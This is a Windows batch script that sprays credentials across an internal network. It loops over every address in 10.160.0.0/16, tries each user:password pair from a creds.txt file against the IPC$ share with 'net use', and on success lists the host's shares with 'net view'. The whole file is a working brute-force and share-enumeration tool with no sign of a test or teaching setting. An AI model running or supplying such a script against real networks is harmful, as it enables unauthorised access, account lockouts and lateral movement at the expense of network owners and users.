@echo off
setlocal enabledelayedexpansion

:: cred_file format = user:password (one per line)
set cred_file=creds.txt

for /L %%A in (0,1,255) do (
    for /L %%B in (1,1,254) do (
        set ip=10.160.%%A.%%B
        echo.
        echo ==========================
        echo Scanning IP: !ip!
        echo ==========================

        for /f "tokens=1,2 delims=:" %%U in (%cred_file%) do (
            set "user=%%U"
            set "pass=%%V"

            echo Trying !user! on !ip!
            net use \\!ip!\IPC$ /user:!user! !pass! >nul 2>&1
            if !errorlevel! == 0 (
                echo [SUCCESS] !user! worked on !ip!
                echo Listing shares on !ip!...
                net view \\!ip! /ALL
                net use /delete \\!ip!\IPC$ >nul 2>&1
            ) else (
                echo [FAILURE] !user! failed on !ip!
            )
        )
    )
)

pause
